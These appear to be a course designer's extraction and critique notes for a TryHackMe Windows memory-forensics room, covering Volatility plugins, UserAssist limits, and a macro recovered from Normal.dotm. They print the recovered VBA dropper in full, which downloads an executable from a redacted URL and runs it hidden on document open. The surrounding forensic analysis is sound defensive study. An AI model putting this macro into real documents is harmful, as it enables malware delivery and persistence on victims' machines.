---
room: Windows Memory & User Activity
url: https://tryhackme.com/room/windowsmemoryanduseractivity
module: Memory Analysis — **second of a three-room set** (Processes → **User Activity** → Network)
feeds: S6 — **`S6-10`** and **`S6-09` capstone**. Also **S5** (UserAssist is an S5 artifact and this
       room corrects our understanding of it) and **S1** (a second safety defect + the responder
       -footprint lesson).
       **Carries one course-wide ATT&CK currency break — see §3 finding 16.**
difficulty / time: Medium · 60 min · 7 tasks · Premium · 2,511 completions
extracted: 2026-08-28
extracted_by: ecdfp-web-extract via Chrome (premium path, logged-in session)
completeness: all 7 tasks read in full. 0 sections NOT READ. Same image, same host and same
              network map as room 12 (transcribed there, not repeated here).
---

## 1. What the room teaches

The middle third of one continuous investigation: **who was at the keyboard, what they ran, what
they opened, and — the payoff — the actual macro source recovered out of RAM.**

Five plugins in sequence: `windows.sessions` → `windows.registry.hivelist` →
`windows.registry.userassist` → `windows.cmdline` → `windows.handles`, then `windows.dumpfiles`
into `unzip` and `olevba`.

**🟢🟢 The last step is the best single artifact in thirteen rooms.** The room dumps `Normal.dotm`
out of the `WINWORD.EXE` process, unzips it, finds `word/vbaProject.bin`, runs `olevba`, and
recovers **complete, readable VBA**:

```vba
Sub AutoOpen()      : DownloadAndExecute : End Sub
Sub Document_Open() : DownloadAndExecute : End Sub

Sub DownloadAndExecute()
    url      = "http:/[REDACTED]/pdfupdater.exe"
    filePath = "C:\Users\operator\pdfupdater.exe"
    If Dir(filePath) <> "" Then Kill filePath        ' delete any existing copy
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
    xmlhttp.Open "GET", url, False : xmlhttp.Send
    If xmlhttp.Status = 200 Then
        Set adoStream = CreateObject("ADODB.Stream")
        adoStream.Type = 1                            ' binary
        adoStream.Open
        adoStream.Write xmlhttp.responseBody
        adoStream.SaveToFile filePath, 2              ' overwrite
        adoStream.Close
        Shell filePath, vbHide                        ' run silently
    End If
End Sub
```

**Memory → dumped file → archive → VBA source.** Four format layers peeled in one task, ending in
the attacker's own code. Nothing else in this path comes close, and `S6-09` should end here.

**But the room does not understand what it found.** It calls `Normal.dotm` *"a template file likely
used by the same Word process"* and moves on. `Normal.dotm` is **Word's global template, loaded on
every Word session.** A macro in it re-runs on **every document the user opens from then on,
including plain `.docx` files with no macros of their own.** That is not a delivery artifact — it
is **persistence, ATT&CK T1137.001**, and it is a *second, independent* persistence mechanism
alongside the Startup-folder binary from room 12. **The room's biggest finding is the one it walks
straight past.** See §3 and §6.

The room also carries a **fabricated kernel structure** (§2.1), a plugin whose output it
systematically misdescribes (§2.1), and a second safety defect (§5).

## 2. Artifacts — one 6-box block each

### 2.1 The session table (`windows.sessions`)

- **What it is** — every process, tagged with the session it ran in and the user it ran as.
- **Where it lives** — 🔴 **not where the room says.** Verified against v2.28.0 source: the plugin
  walks the **`_EPROCESS` active-process list**, reads `_EPROCESS.Session` → `_MM_SESSION_SPACE`
  → `SessionId`, and gets the user name and session type from the process's **PEB environment
  block** (`USERNAME`, `USERDOMAIN`, `SESSIONNAME`). It is a per-process view wearing a
  session-shaped label.
- **What it proves** — which processes shared one interactive session. Here: **everything in the
  malicious chain ran under Session 1, `Console`, as `operator`** — `WINWORD.EXE` (07:13:04) →
  `pdfupdater.exe` (07:13:05) → `windows-update` (07:13:05) → `updater.exe` (07:13:56) →
  `cmd.exe` (07:14:36) → `powershell.exe` (07:14:39). One session, one user, ninety-five seconds.
- **What it does NOT prove** — 🔴🔴 **four separate things the room claims it proves.**
  1. **`Create Time` is the PROCESS creation time, not a logon time.** The plugin reads
     `proc.get_create_time()` — `_EPROCESS.CreateTime`. The room calls these "logon timestamps".
     **There is no logon time anywhere in this output.**
  2. **There is no SID column.** The room says the plugin extracts "user SIDs". `User Name` is a
     string built from environment variables. For SIDs you need `windows.getsids`.
  3. **`Session Type` is not a logon type.** It is the `SESSIONNAME` environment variable copied
     verbatim, with no enumeration or validation. The room calls it "logon types (e.g. console,
     RDP)". It is *conventionally* `Console` or `RDP-Tcp#n`, but nothing in the plugin checks that.
  4. **A blank `Session Type` means no environment block, not "no session"** — which is why every
     Session 0 service row is blank.
  🔴 **And the environment block is user-writable (see §2.4).** A process can lie about its own
  user name here.
- **How to parse it** — `vol -f <image> windows.sessions`. Columns are
  `Session ID | Session Type | Process ID | **Process** | User Name | Create Time` — the fourth is
  `Process`, not `Process Name` as the room prints it.
- **Anti-forensics / false-positive caveat** — 🔴🔴 **the room illustrates this plugin with a
  kernel structure that does not exist.** It prints a `struct SESSION` containing `HFILELIST
  hflist`, `BOOL fAllCabinets`, `BOOL fSelfExtract`, `HFDI hfdi`, `CABINET acab[2]`,
  `achCabinetFile[cbFILE_NAME_MAX]`. That is **Microsoft's `.CAB` archive-extraction SESSION
  struct** from the Cabinet SDK (documented at `learn.microsoft.com/windows/win32/devnotes/session`,
  where Microsoft itself notes it is *"provided for informational purposes only"*). It has nothing
  whatsoever to do with logon sessions. The room also names `_SESSION_MANAGER_INFORMATION`, which
  is **not a real Windows kernel structure**. See §5 — this is a gift of a teaching exercise.

### 2.2 Loaded registry hives (`windows.registry.hivelist`)

- **What it is** — every registry hive resident in kernel memory, with its on-disk path.
- **Where it lives** — the kernel `HiveList`, walked through `CMHIVE` structures.
- **What it proves** — 🟢 **which user profiles were actually loaded.** Here,
  `\??\C:\Users\operator\ntuser.dat` **and** `…\AppData\Local\Microsoft\Windows\UsrClass.dat` are
  both present — the per-user hive and the per-user shell/UWP hive. Also present:
  `\REGISTRY\MACHINE\SYSTEM` and `C:\Windows\AppCompat\Programs\Amcache.hve`.
- **What it does NOT prove** — 🔴 **that the user did anything.** The room says this exactly, if
  clumsily: *"This strongly indicates that the operator account was not only logged in but also
  actively interacting with the system, **but does not show that any potential interaction
  occurred**."* The sentence contradicts itself, but the second half is the correct one: a loaded
  hive proves a profile was loaded — which happens at logon, whether or not the human then touched
  the keyboard. **Fast user switching, a service running as the user, and a `runas` all load a
  hive with nobody present.**
- **How to parse it** — `vol -f <image> windows.registry.hivelist`. The offsets it returns are the
  input to every other `windows.registry.*` plugin.
- **Anti-forensics / false-positive caveat** — 🟢 **the memory copy can be NEWER than the file on
  disk.** Windows lazy-flushes hives: writes land in memory and reconcile to the primary file only
  after roughly an hour of inactivity, at unload, or at shutdown. **A registry answer read from RAM
  can be more current than the same key read from a seized `NTUSER.DAT`, and the difference lives
  in the `.LOG1`/`.LOG2` transaction logs.** This connects room 13 directly to the S5 transaction-log
  matrix from room 4 — **same mechanism, opposite end of the pipeline.**

### 2.3 GUI-launched programs (`windows.registry.userassist`)

- **What it is** — a per-user tally of programs launched **through the graphical shell**.
- **Where it lives** — `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\
  {GUID}\Count`, value names **ROT13-encoded** (still ROT13 on Windows 10/11 — only the Windows 7
  *beta* ever used a Vigenère cipher).
- **What it proves** — that a program was started from the Start Menu, Desktop or Explorer, with a
  **run count**, a **focus count**, a **total focused time**, and a **last-executed timestamp**.
  Here it corroborates the session data: `Command Prompt.lnk` last run **07:12:43** — the exact
  second `cmd.exe` PID 5952 was created.
- **What it does NOT prove** — 🔴🔴 **four hard limits, and the room states none of them.**
  1. **It is GUI-only.** A program started from a command line, a script, a service or another
     process leaves **no UserAssist entry**. **Absence is never evidence of non-execution** — and
     in this very image, the entire malicious chain (`pdfupdater.exe`, `windows-update.exe`,
     `updater.exe`) is process-spawned and therefore **invisible to UserAssist**. The room shows
     the artifact and never says what it cannot see.
  2. **One timestamp, last run only.** Prior executions are unrecoverable; a count of 33 gives you
     33 events and exactly one time.
  3. **No command-line arguments are recorded.**
  4. **The count is an interaction tally, not an execution proof.** On Windows 10+, *"jump to file
     location"* from the Start Menu increments the run count with nothing executed. A non-zero
     count with zero focus time can be a failed launch or a mere shortcut click.
- **How to parse it** — `vol -f <image> windows.registry.userassist`.
  **The `+5` offset is Windows XP only.** Volatility's own source has a field literally named
  `CountStartingAtFive` on the pre-Win7 path and no adjustment on the Win7+ path. **Do not subtract
  5 from a modern count.** Two GUIDs matter and both appear here:
  `{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}` = **executable file execution**;
  `{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}` = **shortcut (.lnk) execution** — which is the one
  carrying every interesting entry in this image. (The room's other two GUIDs,
  `{9E04CAB2-…}` and `{FA99DFC7-…}`, are genuine UserAssist GUIDs but **no source documents what
  they track** — ⚠️ **do not assert a meaning for them in our material.**)
- **Anti-forensics / false-positive caveat** — 🔴 UserAssist is trivially deletable by the user and
  is a standard anti-forensics target. Combined with limit 1, it is **corroborating evidence only**
  — it strengthens a timeline built elsewhere and can never carry one alone.

### 2.4 The process command line (`windows.cmdline`)

- **What it is** — the exact string each process was launched with.
- **Where it lives** — the **PEB** → `RTL_USER_PROCESS_PARAMETERS.CommandLine` (a `UNICODE_STRING`).
  The room prints the struct correctly, which is a nice contrast with §2.1.
- **What it proves** — 🟢 **the single most valuable line in the whole investigation**:
  `5252 WINWORD.EXE "…\WINWORD.EXE" /n "C:\Users\operator\Documents\cv-resume-test.docm" /o ""`
  — Word was launched **with the malicious document as its argument**. `/n` opens a new instance;
  `/o ""` passes an empty "open as" parameter. It also confirms the three payload processes ran
  with **no arguments at all** — nothing was passed to them, so the configuration is inside the
  binaries.
- **What it does NOT prove** — 🔴🔴 **that the process is telling the truth.** The PEB is in
  **user space and writable by the process that owns it**. Rewriting `ProcessParameters` so the
  command line and image path read as something benign is **PEB masquerading**, with its own
  Volatility plugin (`windows.malware.pebmasquerade`). **A command line from `cmdline` is the
  process's claim about itself, not the kernel's record of it.** Neither this room nor room 12
  says so.
- **How to parse it** — `vol -f <image> windows.cmdline`.
- **Anti-forensics / false-positive caveat** — 🟢 **corroborate with a kernel-side source**, which
  is exactly what the room does next with `handles` (§2.5) — without ever explaining that this is
  why.

### 2.5 Open handles (`windows.handles`)

- **What it is** — every kernel object a process had open: files, registry keys, events, sections,
  ALPC ports, mutants.
- **Where it lives** — `_EPROCESS.ObjectTable`, walked entry by entry. **Kernel side** — which is
  what makes it the right corroboration for §2.4.
- **What it proves** — 🟢 the document was **actually opened**, not merely named:
  `5252 WINWORD.EXE … File 0x12019f \Device\HarddiskVolume3\Users\operator\Documents\
  cv-resume-test.docm`. Two independent sources — a user-space argument and a kernel-space file
  handle — now agree.
- **What it does NOT prove** — 🔴 **that the file was read, or what was in it.** A handle is an
  open reference. It also does not prove *when* it was opened — a handle has no timestamp; you
  inherit the process's creation time and nothing finer. And ⚠️ **the volume path is a device path**
  (`\Device\HarddiskVolume3\…`), not a drive letter; mapping `HarddiskVolume3` → `C:` requires the
  mount points and is an assumption until you check it.
- **How to parse it** — `vol -f <image> windows.handles`, then filter. The room's
  `cat handles.txt | grep WINWORD` is the practical form. ⚠️ **It is slow** — minutes on this image.
- **Anti-forensics / false-positive caveat** — the handle table is huge and mostly noise (`Event`,
  `WaitCompletionPacket`, `ALPC Port`). **Filter to `File`, `Key` and `Section` rows or you will
  read four thousand lines to find one.** The room never says this; a student who runs it bare will
  think the tool failed.

### 2.6 `Normal.dotm` — Word's global template, recovered from RAM

- **What it is** — the template Word loads for **every** session. Not "the template of the
  document"; **the template of the application.**
- **Where it lives** — on disk at
  `C:\Users\<user>\AppData\Roaming\Microsoft\Templates\Normal.dotm`; in this image, resident in
  `WINWORD.EXE`'s memory and recoverable as both a `DataSectionObject` (`.dat`) and a
  `SharedCacheMap` (`.vacb`).
- **What it proves** — 🔴🔴 **PERSISTENCE, and the room never says the word.** Microsoft's own
  auto-macro rule is the proof: *"In order for an auto macro to run, it must be either in the
  Normal template, in the active document, or in the template on which the active document is
  based."* Because `Normal.dotm` **is** the Normal template, an `AutoOpen` inside it fires for
  **every document the user opens afterwards — including macro-free `.docx` files.** This is
  **ATT&CK T1137.001 — Office Application Startup: Office Template Macros** (Persistence;
  platforms Office Suite, Windows), whose description names `Normal.dotm` explicitly.
  **This is a second, independent persistence mechanism**, alongside room 12's Startup-folder
  binary — and the more durable of the two, because removing `windows-update.exe` leaves it intact.
- **What it does NOT prove** — ⚠️ **that the `.docm` put it there.** The macro's *presence* in
  `Normal.dotm` is the finding; *how it got there* is a separate question (the `.docm` writing to
  the global template needs `AccessVBOM=1`, or the attacker hijacked `GlobalDotName`). The room
  assumes the `.docm` → `.dotm` direction and never tests it. ⚠️ Also: Word **legitimately rewrites
  `Normal.dotm`** on clean exit when settings change, so **mtime alone is not a finding** and a
  hash mismatch against a baseline is weak on its own.
- **How to parse it** — `vol -f <image> -o 5252/ windows.dumpfiles --pid 5252`, then
  `ls 5252/ | grep dotm`. **`-o` is a global option and must precede the plugin name** — the room
  gets this right where room 12 used `mkdir`/`cd` instead.
- **Anti-forensics / false-positive caveat** — 🟢 **the decisive artifact is simply that a
  `vbaProject.bin` exists at all.** A stock `Normal.dotm` contains **no VBA project**. Its presence
  is the finding; file size and mtime are pivots, not verdicts. Detection sources worth naming:
  Sysmon **EID 11/15** on the template path, **EID 13/14** on `GlobalDotName`, `VbaWarnings` and
  `AccessVBOM`, and **EID 1** for `WINWORD.EXE` spawning anything from a user-writable path.

### 2.7 `vbaProject.bin` — the VBA project inside an OOXML container

- **What it is** — the compiled-and-source VBA storage, an OLE2 stream living inside the
  `.docm`/`.dotm` ZIP at `word/vbaProject.bin`.
- **Where it lives** — inside the OOXML package. A `.docm`/`.dotm` **is a ZIP archive**; a `.docx`
  with no macros has no such part.
- **What it proves** — 🟢 **the attacker's source code, in clear text.** Auto-execution
  (`AutoOpen` + `Document_Open`), the C2 URL, the drop path, the download method, the overwrite
  flag, and the hidden-window launch. It also proves **deliberate redundancy** — two independent
  trigger paths calling one routine, so that if either is suppressed the other still fires.
- **What it does NOT prove** — 🔴 **that this code ran, or ran successfully.** The macro is the
  *capability*. `pdfupdater.exe` existing on disk at the path the macro names is the *execution
  evidence*, and that came from `dlllist` in room 12 — a **different artifact**. Keep the two
  apart; this is criterion 4 of the rubric in one sentence. It also does not prove the download
  succeeded — the macro has an `Else MsgBox "Download failed"` branch that a student should notice.
- **How to parse it** — 🔴 **not the way the room does it.** The room runs
  `unzip` then `olevba word/vbaProject.bin`. **`olevba` reads the container natively** —
  `olevba Normal.dotm` — which removes the unzip step, removes the archive-extraction risk, and is
  the documented supported input (the format list is containers only; a bare `vbaProject.bin` is
  **not documented** as supported). Useful flags: `--decode`, `--reveal`, `--deobf`, `-a`, `--json`.
- **Anti-forensics / false-positive caveat** — ⚠️ **`olevba` is static — it never launches Word and
  never runs the VBA runtime — but "static" is not "zero risk".** Two documented exceptions: `--deobf`
  evaluates VBA *expressions* in a Python parser, and the XLM path uses an emulator. And on the
  released **0.60.2**, attacker-controlled macro text can **inject ANSI escape sequences into your
  terminal** — patched only in the 0.60.3 development branch. See §3.

### 2.8 🔴 The responder's own tool, inside the evidence

- **What it is** — `FTK Imager.exe`, **PID 7788**, running on the compromised host.
- **Where it lives** — in this memory image, in three places at once: the session table
  (Session 1, 07:15:28), `cmdline`
  (`"C:\Program Files\AccessData\FTK Imager\FTK Imager.exe"`), and **UserAssist**
  (`C:\Users\Public\Desktop\AccessData FTK Imager.lnk`, count 6, last run **07:15:27**).
- **What it proves** — 🟢🟢 **the acquisition itself, from inside the acquired data.** The analyst
  double-clicked a Desktop shortcut at **07:15:27**; the process started at **07:15:28**; the dump
  filename encodes **`071528`**. Three independent artifacts, one second apart, all describing the
  responder. **This also settles room 12's timestamp puzzle: `071528` is honest, and the scenario's
  "07:45 CET" is the wrong number.**
- **What it does NOT prove** — 🔴 **it is not attacker activity, and a student who has not been
  told will report it as such.** It is also the plainest possible demonstration that **acquisition
  is not passive**: the tool that captured this image is *in* this image, along with the analyst's
  shell interaction, six UserAssist increments, and every page FTK Imager touched.
- **How to parse it** — cross-reference `windows.sessions`, `windows.cmdline` and
  `windows.registry.userassist` on the same PID. **Establish the responder's own footprint first,
  then exclude it** — before analysing anything else.
- **Anti-forensics / false-positive caveat** — 🔴🔴 **neither room 12 nor room 13 ever mentions
  this.** Room 12 asks *"What is the path of the process with PID 7788?"* and *"dump PID 7788"* as
  routine exercises, without once noting that PID 7788 is **the responder's own imaging tool**.
  🟢 **This is the best find in thirteen rooms and it belongs in `S1` and in `S2` acquisition.**
  We build the exercise: *"Three processes here are not the attacker's. Identify them and say how
  you knew."*

## 3. Tools and commands

| step | command as the room writes it | what it gives |
|---|---|---|
| sessions | `vol -f <image> windows.sessions > sessions.txt` | session ID, type, user, per-process |
| hives | `vol -f <image> windows.registry.hivelist > hivelist.txt` | loaded hives + offsets |
| GUI launches | `vol -f <image> windows.registry.userassist > userassist.txt` | ROT13 UserAssist entries |
| command lines | `vol -f <image> windows.cmdline > cmdline.txt` | PEB command lines |
| handles | `vol -f <image> windows.handles > handles.txt` then `grep WINWORD` | open kernel objects |
| dump files | `vol -f <image> -o 5252/ windows.dumpfiles --pid 5252` | file objects from a process |
| find template | `ls 5252/ \| grep dotm` | locate `Normal.dotm` |
| confirm type | `file <dumped>.dat` → `Microsoft Word 2007+` | identify by content, not extension |
| extract VBA | `unzip <dumped>.dat` then `olevba word/vbaProject.bin` | ⚠️ **replace — see #9** |

### CURRENCY CHECK — verified 2026-08-28

| # | item | result |
|---|---|---|
| 1 | 🔴 **room runs Volatility 3 `2.26.0`** | Current is **2.28.0** (30 Apr 2026). ⚠️ **And room 12 of the same three-room set runs `2.26.2`.** One image, one lab, **two different Volatility builds across two consecutive rooms.** Pin one version for our lab and say which. |
| 2 | 🔴 **invocation differs between the two rooms too** | Room 12 uses the alias **`vol3`** (= `python3 vol.py`, a git-clone install); room 13 uses **`vol`** (a `pip install volatility3` entry point). **Same VM, same set, two conventions.** Pick one for our material and write every command to match — a student who copies across rooms gets "command not found". |
| 3 | ✅ `windows.sessions` | Exists at `plugins/windows/sessions.py`, **not deprecated**. Columns confirmed, with one correction: the 4th is **`Process`**, not `Process Name`. |
| 4 | 🔴🔴 **the room misdescribes what `windows.sessions` outputs** | Of its four claims — session IDs, user SIDs, logon types, logon timestamps — **only session IDs are true.** `Create Time` is `_EPROCESS.CreateTime` (process start). `User Name` is built from the `USERNAME`/`USERDOMAIN` **environment variables**, never a SID. `Session Type` is the `SESSIONNAME` env var verbatim, not a LogonType. **Three of four are wrong.** Full detail in §2.1. |
| 5 | 🔴🔴 **`_SESSION_MANAGER_INFORMATION` is not a real kernel structure** | No kernel-structure reference documents it. The plugin actually uses `_EPROCESS.Session` → **`_MM_SESSION_SPACE.SessionId`** plus the PEB environment block. |
| 6 | 🔴🔴 **the printed "SESSION structure" is the `.CAB` archive struct** | Confirmed against **Microsoft Learn `win32/devnotes/session`** — identical members (`HFDI hfdi`, `CABINET acab[2]`, `fSelfExtract`, `achCabinetFile[cbFILE_NAME_MAX]`, `cMAX_CAB_FILE_OPEN`). It is the **File Decompression Interface** session for extracting cabinet files, and Microsoft's own note says it is *"provided for informational purposes only"*. **It is about `.CAB` archives. It has nothing to do with logon sessions.** The room's copy is also visibly corrupted — `long cbSelfExtractSize;` appears **twice**, and `achLine`/`achLocation`/`achFile`/`achDest` are declared as single `char`s where the original declares arrays. |
| 7 | ⚠️ typo worth catching | *"The **voltage** plugin inspects memory…"* — the room means *volatility*. Harmless, but it is on the same page as findings 4–6. |
| 8 | ✅ `windows.registry.hivelist`, `windows.registry.userassist`, `windows.cmdline`, `windows.handles` | All current in 2.28.0, **none deprecated**. ✅ **And this closes the room-12 action item:** `hivelist` and `userassist` **already live under `windows.registry.`** and have no top-level shim, so they are **not** in the 25 Sep 2026 removal wave (which moves `amcache`/`cachedump`/`hashdump`/`lsadump`/`scheduled_tasks` *into* `windows.registry.*`). |
| 9 | ⚠️ **`oletools` 0.60.2 (2 Jul 2024) is the current release** | Development head is **0.60.3 (changelog entry 2026-01-26)** — maintained, but no new release in two years. **No CVEs** (GitHub Advisory DB and Snyk both return nothing). 🔴 **But 0.60.2 carries an unfixed weakness:** attacker-controlled macro text can inject **ANSI escape sequences into the analyst's terminal** (fixed only on the 0.60.3 dev branch, PR #873, merged 21 May 2025). Relevant because we are telling students to run `olevba` on hostile files in a live terminal. |
| 10 | 🔴 **`olevba` should be pointed at the container, not `vbaProject.bin`** | The documented supported-input list is **containers only** (`.doc/.dot/.docm/.dotm/.xls/.xlsm/.ppt/.pptm/…`). A bare `vbaProject.bin` is **not documented as supported**. `olevba Normal.dotm` also keeps parts *outside* the VBA blob in scope — notably `word/_rels/settings.xml.rels`, where **remote-template injection** hides. **Teach the container form; drop the `unzip` step entirely.** |
| 11 | ✅ `olevba` is static in the way that matters | It never launches Word and never runs the VBA runtime. ⚠️ **But do not claim "it never interprets anything"** — `--deobf` evaluates VBA *expressions* in a Python parser, and the XLM path uses an emulator. Phrase it as: *"olevba reads the file with Python and reconstructs the source; it never hands the sample to Office."* |
| 12 | ✅ the `XLMMacroDeobfuscator: pywin32 is not installed` warning is harmless | pywin32 is optional and Windows-only. 🟢 **On an analysis VM you want that warning** — its absence means a code path exists (`--with-ms-excel`) that would open the sample **in real Excel**. Good one-line teaching point. |
| 13 | 🔴 **`CVE-2019-13232` is a zip bomb, not path traversal** | If our material warns about `unzip`, get the threat right: CVE-2019-13232 is CWE-400 resource consumption, **CVSS 3.3 LOW**. Info-ZIP `unzip` **already strips `../` by default** (*"unzip normally removes ``parent dir'' path components"*); only the `-:` flag disables that. **Zip Slip is a library bug class** (Java/Node/Go/Python wrappers), not an `unzip` bug. Real residual risks: decompression bombs, and extracting outside a disposable directory. |
| 14 | ✅ UserAssist mechanics | ROT13 confirmed, **still applied on Windows 10/11**. `{CEBFF5CD-…}` = executable execution, `{F4E57C4B-…}` = shortcut (.lnk) execution. 🔴 **The `+5` count offset is Windows XP only** — Volatility's source has a `CountStartingAtFive` field on the legacy path and no adjustment for Win7+. ⚠️ The room's other two GUIDs (`{9E04CAB2-…}`, `{FA99DFC7-…}`) are genuine but **undocumented — do not assert a meaning.** |
| 15 | 🔴🔴 **the room misses T1137.001 entirely** | `Normal.dotm` is Word's **global template, loaded every session**. A macro in it is **ATT&CK T1137.001 — Office Application Startup: Office Template Macros** (Persistence; platforms **Office Suite, Windows**; last modified 12 May 2026), whose description names `Normal.dotm` by name. Microsoft's auto-macro rule proves the scope: an auto macro runs if it is *"in the Normal template, in the active document, or in the template on which the active document is based"* — so `AutoOpen` in `Normal.dotm` fires for **every document, including macro-free `.docx`**. **This is the room's biggest missed finding.** Family: T1137 `.001` Office Template Macros · `.002` Office Test · `.003` Outlook Forms · `.004` Outlook Home Page · `.005` Outlook Rules · `.006` Add-ins. |
| 16 | 🔴🔴 **COURSE-WIDE: ATT&CK v19 renamed TA0005 "Defense Evasion" → "Stealth"** | The old Defense Evasion tactic was **split**: **TA0005 is now "Stealth"**, and the rest became **TA0112 "Defense Impairment"**. Verified on the live T1564 page (*"Tactic: Stealth"*). **Any slide, rubric or case template in this course that says "Defense Evasion (TA0005)" is now stale.** Validated against **ATT&CK Enterprise v19.2** (v19 released 2026-04-28; v19.2 point release 2026-08-06). **Action: grep the whole repo for "Defense Evasion" before S1 is built.** |
| 17 | ➕ correct ATT&CK for this room's macro | **T1059.005** Visual Basic (the VBA runs) · **T1105** Ingress Tool Transfer (`MSXML2.XMLHTTP` + `ADODB.Stream` fetch and save) · **T1564.003** Hidden Window (`Shell filePath, vbHide` — tactic **Stealth**, not Defense Evasion) · **T1137.001** Office Template Macros (the persistence the room missed). With room 12's corrections the full chain is **T1566.001 → T1204.002 → T1059.005 → T1105 → T1564.003 → T1137.001 → T1547.001**. |

**Net: the plugin sequence is right, the artifact recovery is excellent, and almost every
explanatory paragraph attached to it needs correcting before it reaches a student.**

## 4. Evidence used

- **The same image as room 12** — `THM-WIN-001_071528_07052025.mem`, host `WIN-001`, Windows 10
  22H2 (10.0.19045), user `operator`, MD5 `78535fc49ab54fed57919255709ae650`.
- Same scenario page, same network map, **same four documentation inconsistencies** — transcribed
  and analysed in `windows-memory-and-processes.md` §4. Not repeated here.
- **Not downloadable. No licence offered. Not reusable.** Nothing for `ecdfp-evidence`.

### 🟢 One inconsistency is now RESOLVED — and it strengthens the exercise

Room 12 flagged that the filename timestamp `071528` disagreed with the scenario's *"07:45 CET"*.
Room 13 settles it: **`FTK Imager.exe` PID 7788 was launched at 07:15:28 UTC**, one second after the
analyst double-clicked its Desktop shortcut at 07:15:27 (UserAssist). **The filename is honest; the
narrative is wrong** — and it is wrong twice over, since 07:45 CET in May is CEST = **05:45 UTC**,
which is *before* the attack even starts.

**This upgrades the §4 audit exercise from "spot the contradictions" to "spot them, then use the
artifacts to determine which version is true."** That is a much better exercise: the students do not
just find the error, they **adjudicate it from evidence**. Move it up in priority.

### 🟢 New Tier 1 idea: the responder-footprint exercise

We cannot reuse this image, but **we can reproduce the phenomenon trivially on `EVI-SRC01`**:
run our acquisition tool from a Desktop shortcut before capturing, and our own memory image will
contain the tool, its UserAssist entry and its session row — for free, with no extra staging.

Students are then asked to **separate responder activity from subject activity before analysis
begins.** That is a real professional habit (it is the memory-image equivalent of documenting who
touched the scene) and **no room in this path teaches it.** Costs us nothing to build.

## 5. Lab design worth reusing

1. **🟢🟢 Two independent sources for one claim.** `cmdline` (user-space PEB) says Word was launched
   with the `.docm`; `handles` (kernel-space object table) says Word actually had the file open.
   **The room runs both and gets the right answer twice** — it just never tells the student that
   *corroborating a user-space claim with a kernel-space fact is the point*. One sentence from us
   turns a procedure into a principle, and it is the same principle as room 11's `pslist`/`psscan`
   pairing. **Make "user-space claim ↔ kernel-space record" an explicit rule in `S6-10`.**
2. **🟢🟢 Peeling four format layers to reach source code.** memory image → file object → OOXML
   container → OLE2 VBA stream → readable VBA. Each step uses a different tool and each output is
   the next input. **This is the best single exercise in thirteen rooms** and it should be the
   closing act of `S6-09`.
3. **🟢 Redundant triggers as a finding.** `AutoOpen` **and** `Document_Open` both calling one
   routine is deliberate: two independent paths, so suppressing one still leaves the other. Ask
   students *why there are two* — it is a question about the attacker's thinking, answerable from
   the artifact.
4. **🟢 `-o <dir>` before the plugin name.** Correct global-option placement, and better than room
   12's `mkdir`/`cd`. Adopt room 13's form.
5. **🟢 One clumsy but correct limit statement** — *"…but does not show that any potential
   interaction occurred"* (§2.2). The sentence contradicts its own first half, but the instinct is
   right and it is the only "does not prove" language in the room. **Quote the good half.**
6. **⚠️ Salvageable: the timeline in Task 7.** The room's conclusion lists seven findings, **each
   with the plugin that produced it**. That format — *claim → the artifact that supports it* — is
   exactly our case-notes discipline. It is let down only by the claims themselves (it asserts the
   `.docm` "triggered a linked template", which is the T1137.001 miss).

### 🔴 Safety defect — extract-and-inspect with no containment

`unzip` an attacker-controlled OOXML file into the home directory, then `olevba` it. Specifically:

- **`cp` the malware artifact to `~`, then `unzip` in place**, scattering attacker-controlled paths
  through the user's home directory. No disposable directory, no `unzip -l` first, no size cap.
- **No mention that the recovered macro contains live C2 infrastructure.** The room redacts the URL
  for the puzzle; in a real case that string is **an active host you must not resolve or fetch from
  the analysis network**. Nothing in the room says so.
- **The `unzip` step is unnecessary.** `olevba Normal.dotm` reads the container directly. The safest
  fix is also the simpler command.

**This is the fifth safety defect in thirteen rooms, and the second in the memory block.**

| room | defect |
|---|---|
| 6 · FAT32 | paste-recovered PowerShell into a live shell |
| 8 · File Carving | `binwalk -e` with no isolation (CVE-2022-4510) |
| 9 · MBR/GPT | edit and save the evidence image in place |
| 12 · Memory & Processes | dump live malware to the home directory, no containment |
| **13 · Memory & User Activity** | **`unzip` hostile OOXML in `~`; live C2 URL never flagged** |

🟢 **The pattern is now unmistakable and it is one sentence:** *every one of these five is a
technically correct instruction with the containment step missing.* That sentence **is** the `S1`
exercise. Five is more than enough — **stop collecting, write it.**

### 🔴 A sixth, different failure: teaching from a fabricated structure

Findings 5 and 6 in §3 are not a safety issue but they are a **sourcing** issue, and they belong in
`S1` for a different reason. The room needed a "SESSION structure", searched for one, found
Microsoft's `.CAB` extraction struct, and printed it — **corrupted in transit** (a duplicated
field, four arrays flattened to single `char`s). Nobody checked whether the fields made sense.

🟢 **This is the best "verify your sources" exercise available and it costs nothing to build.**
Show students the struct with no commentary and ask: *does this describe a logon session?* The
answer is visible in the field names — `fSelfExtract`, `acab[2]`, `achCabinetFile`. **A structure
about cabinet archives was published as a structure about user logons, in a paid course, and read
by 2,511 people.** That is the lesson: expertise is not a substitute for reading the fields.

## 6. Question patterns

**11 questions across 7 tasks.** Better than room 12, still not our target.

**⚠️ Five are recall or single-value lookup.** *"Which plugin should be used to identify user login
sessions from memory?"* · *"Which Volatility 3 plugin reveals evidence of programs launched through
the graphical interface?"* · *"What is the name of the plugin that extracts open files, registry
keys and kernel objects from process handle tables?"* — three plugin-name questions in one room.

**🟢 Four are genuinely good, and one is excellent.**
- *"Which user was logged into a console session when WINWORD.EXE and updater.exe were executed?"*
  — **requires correlating two processes against one session row.** Real work.
- *"What is the full device path where the `.docm` file was found open in WINWORD.EXE's memory
  space?"* — forces the student to notice it is a **device path** (`\Device\HarddiskVolume3\…`),
  not a drive letter. Small, precise, and it teaches something.
- *"What Windows command-line switch was used to open WINWORD.EXE in a new instance?"* (`/n`) —
  reading an argument string with intent.
- 🟢🟢 *"What is the full URL hardcoded in the macro for downloading the executable?"* — **the
  student must dump a file object from memory, identify it, open the container, extract the VBA and
  read it.** Five tools, one answer, and the answer is a real IOC. **This is the shape we want.**

**🔴 Thirteenth room, still no question whose answer is "cannot be determined."** And this room had
**three** ready-made candidates it declined to ask:

| the room could have asked | correct answer |
|---|---|
| *"UserAssist shows no entry for `updater.exe`. Did it run?"* | **Cannot be determined from UserAssist** — it records GUI-initiated launches only, and `updater.exe` was process-spawned. `pslist` proves it ran. |
